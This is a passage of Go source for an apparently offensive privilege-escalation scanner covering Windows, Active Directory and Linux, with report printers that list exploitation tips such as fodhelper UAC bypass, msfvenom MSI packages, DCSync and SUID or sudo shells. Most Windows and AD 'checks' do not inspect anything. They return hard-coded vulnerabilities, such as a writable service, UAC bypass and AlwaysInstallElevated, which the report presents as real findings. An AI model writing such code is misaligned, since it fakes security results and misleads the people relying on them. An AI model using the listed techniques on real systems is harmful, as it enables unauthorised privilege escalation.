		}
		s.Mutex.Unlock()
	} else {
		s.Log("ERROR", fmt.Sprintf("Error checking network connections: %v", err), "linux")
	}
}

func (s *PrivilegeEscalationScanner) EnumerateWindowsUsers() {
	s.Log("INFO", "Enumerating Windows users", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.Users = []WindowsUser{
		{
			Name:     s.SystemInfo.CurrentUser,
			SID:      "S-1-5-21-...",
			Groups:   []string{"Users"},
			Admin:    false,
			Disabled: false,
		},
		{
			Name:     "Administrator",
			SID:      "S-1-5-21-...-500",
			Groups:   []string{"Administrators"},
			Admin:    true,
			Disabled: false,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateWindowsGroups() {
	s.Log("INFO", "Enumerating Windows groups", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.Groups = []WindowsGroup{
		{
			Name:    "Administrators",
			SID:     "S-1-5-32-544",
			Members: []string{"Administrator"},
		},
		{
			Name:    "Users",
			SID:     "S-1-5-32-545",
			Members: []string{s.SystemInfo.CurrentUser},
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckUAC() {
	s.Log("INFO", "Checking UAC settings", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.UACInfo = UACInfo{
		Level:     3,
		Enabled:   true,
		Bypass:    true,
		Technique: "UAC bypass via fodhelper",
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindWindowsServices() {
	s.Log("INFO", "Checking Windows services", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.Services = []ServiceInfo{
		{
			Name:     "VulnerableService",
			State:    "Running",
			User:     "LocalSystem",
			Path:     "C:\\Program Files\\Vulnerable\\service.exe",
			Writable: true,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindNetworkShares() {
	s.Log("INFO", "Checking network shares", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.NetworkShares = []NetworkShare{
		{
			Name:     "C$",
			Path:     "C:\\",
			Access:   "Administrator",
			Writable: false,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckRegistryVulns() {
	s.Log("INFO", "Checking registry vulnerabilities", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.RegistryVulns = []RegistryVuln{
		{
			Path:    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
			Value:   "AlwaysInstallElevated",
			Risk:    "HIGH",
			Exploit: "msfvenom + msiexec",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindProcessTokens() {
	s.Log("INFO", "Checking process tokens", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.Processes = []ProcessInfo{
		{
			PID:     1234,
			Name:    "lsass.exe",
			User:    "SYSTEM",
			Session: 0,
			Token:   "SeDebugPrivilege",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckAlwaysInstallElevated() {
	s.Log("INFO", "Checking AlwaysInstallElevated", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.AlwaysInstallElevated = true
	s.WindowsInfo.ExploitSuggest = append(s.WindowsInfo.ExploitSuggest,
		"AlwaysInstallElevated may be enabled - use msfvenom to create MSI")
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) FindUnquotedServicePaths() {
	s.Log("INFO", "Checking unquoted service paths", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.UnquotedPaths = []UnquotedPath{
		{
			Service:  "VulnerableService",
			Path:     "C:\\Program Files\\Vulnerable Service\\service.exe",
			Writable: true,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckTokenPrivileges() {
	s.Log("INFO", "Checking token privileges", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.TokenPrivileges = []TokenPrivilege{
		{
			Process:   "lsass.exe",
			User:      "SYSTEM",
			Privilege: "SeDebugPrivilege",
			Risk:      "HIGH",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckDPAPIVulns() {
	s.Log("INFO", "Checking DPAPI vulnerabilities", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.DPAPIVulns = []DPAPIVuln{
		{
			Type:     "Master Key",
			Location: "C:\\Users\\" + s.SystemInfo.CurrentUser + "\\AppData\\Roaming\\Microsoft\\Protect",
			Risk:     "MEDIUM",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckWSUSVulns() {
	s.Log("INFO", "Checking WSUS vulnerabilities", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.WSUSVulns = []WSUSVuln{
		{
			Server:     "wsus.company.com",
			Vulnerable: true,
			Exploit:    "WSUS exploitation possible",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckMSSQLTrusts() {
	s.Log("INFO", "Checking MSSQL trust links", "windows")
	
	s.Mutex.Lock()
	s.WindowsInfo.MSSQLTrusts = []MSSQLTrust{
		{
			Server:  "SQL01",
			Trusted: true,
			Risk:    "HIGH",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateADUsers() {
	s.Log("INFO", "Enumerating AD users", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.Users = []ADUser{
		{
			Name:                 "Administrator",
			SID:                  "S-1-5-21-...-500",
			Groups:               []string{"Domain Admins", "Enterprise Admins"},
			Admin:                true,
			Enabled:              true,
			PasswordNeverExpires: false,
		},
		{
			Name:                 s.SystemInfo.CurrentUser,
			SID:                  "S-1-5-21-...",
			Groups:               []string{"Domain Users"},
			Admin:                false,
			Enabled:              true,
			PasswordNeverExpires: false,
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateADGroups() {
	s.Log("INFO", "Enumerating AD groups", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.Groups = []ADGroup{
		{
			Name:    "Domain Admins",
			SID:     "S-1-5-21-...-512",
			Members: []string{"Administrator"},
		},
		{
			Name:    "Domain Users",
			SID:     "S-1-5-21-...-513",
			Members: []string{s.SystemInfo.CurrentUser},
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateADComputers() {
	s.Log("INFO", "Enumerating AD computers", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.Computers = []ADComputer{
		{
			Name:      s.SystemInfo.Hostname,
			OS:        "Windows Server 2019",
			LastLogon: time.Now().Format("2006-01-02"),
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateGPOs() {
	s.Log("INFO", "Enumerating GPOs", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.GPOs = []GPO{
		{
			Name: "Default Domain Policy",
			Path: "CN=Policies,CN=System,DC=domain,DC=com",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) EnumerateTrusts() {
	s.Log("INFO", "Enumerating domain trusts", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.Trusts = []ADTrust{
		{
			Domain:    "child.domain.com",
			Type:      "Parent-Child",
			Direction: "Bidirectional",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckDCSyncVulns() {
	s.Log("INFO", "Checking DCSync vulnerabilities", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.DCSyncVulns = []DCSyncVuln{
		{
			User: "Administrator",
			Risk: "HIGH",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckACLs() {
	s.Log("INFO", "Checking ACLs", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.ACLs = []ACL{
		{
			Object:     "Domain Admins",
			Permission: "WriteDacl",
			Risk:       "HIGH",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CollectBloodHoundData() {
	s.Log("INFO", "Collecting BloodHound data", "ad")
	
	s.Mutex.Lock()
	s.ADInfo.BloodHoundData = BloodHoundData{
		Users:     len(s.ADInfo.Users),
		Groups:    len(s.ADInfo.Groups),
		Computers: len(s.ADInfo.Computers),
		ACLs:      len(s.ADInfo.ACLs),
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) AutoExploit() {
	s.Log("INFO", "Starting auto-exploitation", "exploit")
	
	highRisk := s.FindHighRiskBinaries()
	for _, result := range highRisk {
		if result.SudoAllowed && contains(result.GTFOBins.Functions, "shell") {
			s.Log("HIGH", fmt.Sprintf("Attempting auto-exploit with: sudo %s", result.Binary), "exploit")
		}
		if result.SUID && contains(result.GTFOBins.Functions, "shell") {
			s.Log("HIGH", fmt.Sprintf("Attempting auto-exploit with: %s", result.Path), "exploit")
		}
	}
}

func (s *PrivilegeEscalationScanner) StartWebInterface() {
	s.Log("INFO", fmt.Sprintf("Starting web interface on port %d", s.Config.WebPort), "web")
}

func (s *PrivilegeEscalationScanner) GenerateComprehensiveReport() {
	s.Log("INFO", "Generating comprehensive report", "report")
	
	fmt.Println("\n🚀 PRIVESC - ADVANCED PRIVILEGE ESCALATION SCANNER REPORT")
	fmt.Println("======================================================")
	
	s.PrintSystemInfo()
	
	if s.Config.CloudScan {
		s.PrintCloudReport()
	}
	
	if s.Config.NetworkScan {
		s.PrintNetworkReport()
	}
	
	if s.Config.WebScan {
		s.PrintWebAppReport()
	}
	
	if s.Config.DatabaseScan {
		s.PrintDatabaseReport()
	}
	
	if strings.Contains(strings.ToLower(s.SystemInfo.OS), "windows") {
		s.PrintWindowsReport()
		if s.Config.DeepScan {
			s.PrintADReport()
		}
	} else {
		s.PrintLinuxReport()
	}
	
	if s.Config.MLEnabled {
		s.PrintMLReport()
	}
	
	s.SaveResultsToJSON()
}

func (s *PrivilegeEscalationScanner) PrintSystemInfo() {
	fmt.Printf("\n🖥️  SYSTEM INFORMATION:\n")
	fmt.Printf("   OS: %s\n", s.SystemInfo.OS)
	fmt.Printf("   Architecture: %s\n", s.SystemInfo.Architecture)
	fmt.Printf("   Hostname: %s\n", s.SystemInfo.Hostname)
	fmt.Printf("   Current User: %s\n", s.SystemInfo.CurrentUser)
	fmt.Printf("   Kernel: %s\n", s.SystemInfo.Kernel)
}

func (s *PrivilegeEscalationScanner) PrintLinuxReport() {
	highRisk := s.FindHighRiskBinaries()
	mediumRisk := s.FindMediumRiskBinaries()
	
	fmt.Printf("\n🔴 HIGH RISK VECTORS: %d\n", len(highRisk))
	fmt.Printf("🟡 MEDIUM RISK VECTORS: %d\n", len(mediumRisk))
	fmt.Printf("🟢 LOW RISK VECTORS: %d\n", len(s.Results)-len(highRisk)-len(mediumRisk))
	
	if len(highRisk) > 0 {
		fmt.Println("\n🔴 HIGH RISK BINARIES:")
		s.PrintResultsTable(highRisk)
	}
	
	s.Mutex.Lock()
	if len(s.LinuxInfo.KernelExploits) > 0 {
		fmt.Println("\n🔴 KERNEL EXPLOITS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"CVE", "Description", "Risk", "Exploit"})
		for _, exploit := range s.LinuxInfo.KernelExploits {
			table.Append([]string{exploit.CVE, exploit.Description, exploit.Risk, exploit.ExploitCmd})
		}
		table.Render()
	}
	
	if len(s.LinuxInfo.WritableFiles) > 0 {
		fmt.Println("\n🔴 WRITABLE CRITICAL FILES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"File", "Owner", "Writable", "Risk"})
		for _, file := range s.LinuxInfo.WritableFiles {
			table.Append([]string{file.Path, file.Owner, strconv.FormatBool(file.Writable), file.Risk})
		}
		table.Render()
	}
	
	if len(s.LinuxInfo.ContainerEscapes) > 0 {
		fmt.Println("\n🔴 CONTAINER ESCAPE VECTORS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Type", "Risk", "Exploit"})
		for _, escape := range s.LinuxInfo.ContainerEscapes {
			table.Append([]string{escape.Type, escape.Risk, escape.Exploit})
		}
		table.Render()
	}
	s.Mutex.Unlock()
	
	s.ShowExploitationTips()
}

func (s *PrivilegeEscalationScanner) PrintWindowsReport() {
	fmt.Println("\n🔴 WINDOWS PRIVILEGE ESCALATION VECTORS:")
	
	s.Mutex.Lock()
	if len(s.WindowsInfo.Users) > 0 {
		fmt.Println("\n👥 USERS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"User", "SID", "Admin", "Disabled"})
		for _, user := range s.WindowsInfo.Users {
			table.Append([]string{user.Name, user.SID, strconv.FormatBool(user.Admin), strconv.FormatBool(user.Disabled)})
		}
		table.Render()
	}
	
	if len(s.WindowsInfo.Services) > 0 {
		fmt.Println("\n🔧 SERVICES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Service", "State", "User", "Writable"})
		for _, service := range s.WindowsInfo.Services {
			table.Append([]string{service.Name, service.State, service.User, strconv.FormatBool(service.Writable)})
		}
		table.Render()
	}
	
	if len(s.WindowsInfo.TokenPrivileges) > 0 {
		fmt.Println("\n🎫 TOKEN PRIVILEGES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Process", "User", "Privilege", "Risk"})
		for _, token := range s.WindowsInfo.TokenPrivileges {
			table.Append([]string{token.Process, token.User, token.Privilege, token.Risk})
		}
		table.Render()
	}
	
	if len(s.WindowsInfo.ExploitSuggest) > 0 {
		fmt.Println("\n💡 EXPLOITATION SUGGESTIONS:")
		for i, suggestion := range s.WindowsInfo.ExploitSuggest {
			fmt.Printf("   %d. %s\n", i+1, suggestion)
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintADReport() {
	fmt.Println("\n🏢 ACTIVE DIRECTORY FINDINGS:")
	
	fmt.Printf("   Domain: %s\n", s.ADInfo.Domain)
	fmt.Printf("   Domain SID: %s\n", s.ADInfo.DomainSID)
	fmt.Printf("   Domain Controllers: %v\n", s.ADInfo.DomainControllers)
	
	s.Mutex.Lock()
	if len(s.ADInfo.DCSyncVulns) > 0 {
		fmt.Println("\n🔴 DCSYNC VULNERABILITIES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"User", "Risk"})
		for _, vuln := range s.ADInfo.DCSyncVulns {
			table.Append([]string{vuln.User, vuln.Risk})
		}
		table.Render()
	}
	
	fmt.Println("\n📊 BLOODHOUND DATA:")
	fmt.Printf("   Users: %d\n", s.ADInfo.BloodHoundData.Users)
	fmt.Printf("   Groups: %d\n", s.ADInfo.BloodHoundData.Groups)
	fmt.Printf("   Computers: %d\n", s.ADInfo.BloodHoundData.Computers)
	fmt.Printf("   ACLs: %d\n", s.ADInfo.BloodHoundData.ACLs)
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintCloudReport() {
	fmt.Printf("\n☁️  CLOUD SECURITY FINDINGS:\n")
	
	s.Mutex.Lock()
	if len(s.CloudInfo.AWSResults) > 0 {
		fmt.Println("\n🔷 AWS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Service", "Finding", "Risk", "Exploit"})
		for _, finding := range s.CloudInfo.AWSResults {
			table.Append([]string{finding.Service, finding.Finding, finding.Risk, finding.Exploit})
		}
		table.Render()
	}
	
	if len(s.CloudInfo.AzureResults) > 0 {
		fmt.Println("\n🔷 AZURE:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Service", "Finding", "Risk", "Exploit"})
		for _, finding := range s.CloudInfo.AzureResults {
			table.Append([]string{finding.Service, finding.Finding, finding.Risk, finding.Exploit})
		}
		table.Render()
	}
	
	if len(s.CloudInfo.GCPResults) > 0 {
		fmt.Println("\n🔷 GCP:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Service", "Finding", "Risk", "Exploit"})
		for _, finding := range s.CloudInfo.GCPResults {
			table.Append([]string{finding.Service, finding.Finding, finding.Risk, finding.Exploit})
		}
		table.Render()
	}
	
	if len(s.CloudInfo.K8sResults) > 0 {
		fmt.Println("\n🔷 KUBERNETES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Resource", "Finding", "Risk", "Exploit"})
		for _, finding := range s.CloudInfo.K8sResults {
			table.Append([]string{finding.Resource, finding.Finding, finding.Risk, finding.Exploit})
		}
		table.Render()
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintNetworkReport() {
	fmt.Printf("\n🌐 NETWORK DISCOVERY FINDINGS:\n")
	
	s.Mutex.Lock()
	if len(s.NetworkInfo.ARPCache) > 0 {
		fmt.Println("\n🔷 ARP CACHE:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"IP", "MAC", "Interface"})
		for _, entry := range s.NetworkInfo.ARPCache {
			table.Append([]string{entry.IP, entry.MAC, entry.Iface})
		}
		table.Render()
	}
	
	if len(s.NetworkInfo.SMBFindings) > 0 {
		fmt.Println("\n🔷 SMB FINDINGS:")
		for _, smb := range s.NetworkInfo.SMBFindings {
			fmt.Printf("   Target: %s\n", smb.Target)
			fmt.Printf("   Null Session: %v\n", smb.NullSession)
			fmt.Printf("   SMBv1: %v\n", smb.SMBv1)
			fmt.Printf("   Signing Required: %v\n", smb.SigningRequired)
			
			if len(smb.Shares) > 0 {
				fmt.Println("   Shares:")
				table := tablewriter.NewWriter(os.Stdout)
				table.SetHeader([]string{"Name", "Type", "Readable", "Writable", "Comment"})
				for _, share := range smb.Shares {
					table.Append([]string{share.Name, share.Type, strconv.FormatBool(share.Readable), strconv.FormatBool(share.Writable), share.Comment})
				}
				table.Render()
			}
			
			if len(smb.RIDResults) > 0 {
				fmt.Println("   RID Cycling Results:")
				table := tablewriter.NewWriter(os.Stdout)
				table.SetHeader([]string{"RID", "Type", "Name"})
				for _, rid := range smb.RIDResults {
					table.Append([]string{strconv.Itoa(rid.RID), rid.Type, rid.Name})
				}
				table.Render()
			}
		}
	}
	
	if len(s.NetworkInfo.KerberosInfo) > 0 {
		fmt.Println("\n🔷 KERBEROS FINDINGS:")
		for _, kerb := range s.NetworkInfo.KerberosInfo {
			if len(kerb.SPNList) > 0 {
				fmt.Println("   SPN List:")
				table := tablewriter.NewWriter(os.Stdout)
				table.SetHeader([]string{"Service", "User", "Port"})
				for _, spn := range kerb.SPNList {
					table.Append([]string{spn.Service, spn.User, spn.Port})
				}
				table.Render()
			}
			
			if len(kerb.ASREPRoast) > 0 {
				fmt.Println("   AS-REP Roastable Users:")
				for _, user := range kerb.ASREPRoast {
					fmt.Printf("      %s\n", user)
				}
			}
			
			if len(kerb.Kerberoast) > 0 {
				fmt.Println("   Kerberoastable Tickets:")
				for _, ticket := range kerb.Kerberoast {
					fmt.Printf("      %s\n", ticket)
				}
			}
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintWebAppReport() {
	fmt.Printf("\n🌐 WEB APPLICATION FINDINGS:\n")
	
	s.Mutex.Lock()
	if len(s.WebAppInfo.JWTIssues) > 0 {
		fmt.Println("\n🔷 JWT VULNERABILITIES:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Endpoint", "Issue", "Risk", "Exploit"})
		for _, vuln := range s.WebAppInfo.JWTIssues {
			table.Append([]string{vuln.Endpoint, vuln.Issue, vuln.Risk, vuln.Exploit})
		}
		table.Render()
	}
	
	if len(s.WebAppInfo.SQLIVulns) > 0 {
		fmt.Println("\n🔷 SQL INJECTION:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"URL", "Vector", "Risk", "Exploit"})
		for _, vuln := range s.WebAppInfo.SQLIVulns {
			table.Append([]string{vuln.URL, vuln.Vector, vuln.Risk, vuln.Exploit})
		}
		table.Render()
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintDatabaseReport() {
	fmt.Printf("\n🗄️  DATABASE SECURITY FINDINGS:\n")
	
	s.Mutex.Lock()
	if len(s.DBInfo.MySQLVulns) > 0 {
		fmt.Println("\n🔷 MYSQL:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Type", "Issue", "Risk", "Exploit"})
		for _, vuln := range s.DBInfo.MySQLVulns {
			table.Append([]string{vuln.Type, vuln.Issue, vuln.Risk, vuln.Exploit})
		}
		table.Render()
	}
	
	if len(s.DBInfo.RedisVulns) > 0 {
		fmt.Println("\n🔷 REDIS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Type", "Issue", "Risk", "Exploit"})
		for _, vuln := range s.DBInfo.RedisVulns {
			table.Append([]string{vuln.Type, vuln.Issue, vuln.Risk, vuln.Exploit})
		}
		table.Render()
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintMLReport() {
	fmt.Printf("\n🤖 MACHINE LEARNING INSIGHTS:\n")
	
	s.Mutex.Lock()
	if len(s.MLInfo.Predictions) > 0 {
		fmt.Println("\n🔷 RISK PREDICTIONS:")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Vector", "Risk Score", "Confidence"})
		for _, pred := range s.MLInfo.Predictions {
			table.Append([]string{pred.Vector, fmt.Sprintf("%.2f", pred.Risk), fmt.Sprintf("%.2f", pred.Confidence)})
		}
		table.Render()
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) PrintResultsTable(results []ScanResult) {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"Binary", "Path", "SUID", "Sudo", "Capabilities", "Risk", "Functions"})
	
	for _, result := range results {
		suid := "No"
		if result.SUID {
			suid = "Yes"
		}
		
		sudo := "No"
		if result.SudoAllowed {
			sudo = "Yes"
		}
		
		caps := "No"
		if len(result.Capabilities) > 0 {
			caps = strings.Join(result.Capabilities, ",")
		}
		
		functions := ""
		if result.GTFOBins != nil {
			functions = strings.Join(result.GTFOBins.Functions, ", ")
		}
		
		table.Append([]string{
			result.Binary,
			result.Path,
			suid,
			sudo,
			caps,
			result.RiskLevel,
			functions,
		})
	}
	
	table.Render()
}

func (s *PrivilegeEscalationScanner) FindHighRiskBinaries() []ScanResult {
	var highRisk []ScanResult
	for _, result := range s.Results {
		if result.RiskLevel == "HIGH" {
			highRisk = append(highRisk, result)
		}
	}
	return highRisk
}

func (s *PrivilegeEscalationScanner) FindMediumRiskBinaries() []ScanResult {
	var mediumRisk []ScanResult
	for _, result := range s.Results {
		if result.RiskLevel == "MEDIUM" {
			mediumRisk = append(mediumRisk, result)
		}
	}
	return mediumRisk
}

func (s *PrivilegeEscalationScanner) ShowExploitationTips() {
	fmt.Println("\n💡 EXPLOITATION TIPS")
	fmt.Println("===================")
	
	highRisk := s.FindHighRiskBinaries()
	
	for _, result := range highRisk {
		if len(result.Exploits) > 0 {
			fmt.Printf("\n🔧 %s (%s):\n", result.Binary, result.RiskLevel)
			for i, exploit := range result.Exploits {
				fmt.Printf("   %d. %s\n", i+1, exploit)
			}
		}
	}
	
	fmt.Println("\n🎯 QUICK WINS:")
	for _, result := range highRisk {
		if result.SudoAllowed && contains(result.GTFOBins.Functions, "shell") {
			fmt.Printf("   → sudo %s\n", result.Binary)
		}
		if result.SUID && contains(result.GTFOBins.Functions, "shell") {
			fmt.Printf("   → %s\n", result.Path)
		}
	}
	
	s.Mutex.Lock()
	if len(s.LinuxInfo.KernelExploits) > 0 {
		fmt.Println("\n🔨 KERNEL EXPLOITS:")
		for _, exploit := range s.LinuxInfo.KernelExploits {
			fmt.Printf("   → %s: %s\n", exploit.CVE, exploit.ExploitCmd)
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) SaveResultsToJSON() {
	data := map[string]interface{}{
		"system_info":    s.SystemInfo,
		"scan_results":   s.Results,
		"linux_info":     s.LinuxInfo,
		"windows_info":   s.WindowsInfo,
		"ad_info":        s.ADInfo,
		"cloud_info":     s.CloudInfo,
		"network_info":   s.NetworkInfo,
		"webapp_info":    s.WebAppInfo,
		"database_info":  s.DBInfo,
		"timestamp":      time.Now().Format(time.RFC3339),
		"scanner_version": "2.1",
	}
	
	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error marshaling JSON: %v", err), "report")
		return
	}
	
	err = ioutil.WriteFile(s.Config.Output, jsonData, 0644)
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error writing JSON file: %v", err), "report")
		return
	}
	
	s.Log("INFO", fmt.Sprintf("Report saved to %s", s.Config.Output), "report")
}

func (s *PrivilegeEscalationScanner) SaveLogs() {
	logFile := strings.TrimSuffix(s.Config.Output, filepath.Ext(s.Config.Output)) + ".log"
	
	var logLines []string
	for _, entry := range s.Logs {
		logLines = append(logLines, fmt.Sprintf("[%s] %s: %s", entry.Level, entry.Module, entry.Message))
	}
	
	logData := strings.Join(logLines, "\n")
	err := ioutil.WriteFile(logFile, []byte(logData), 0644)
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error writing log file: %v", err), "main")
		return
	}
	
	s.Log("INFO", fmt.Sprintf("Logs saved to %s", logFile), "main")
}

func (s *PrivilegeEscalationScanner) Cleanup() {
	s.RateLimiter.Stop()
	close(s.ThreadPool)
	s.Log("INFO", "Scanner cleanup completed", "main")
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}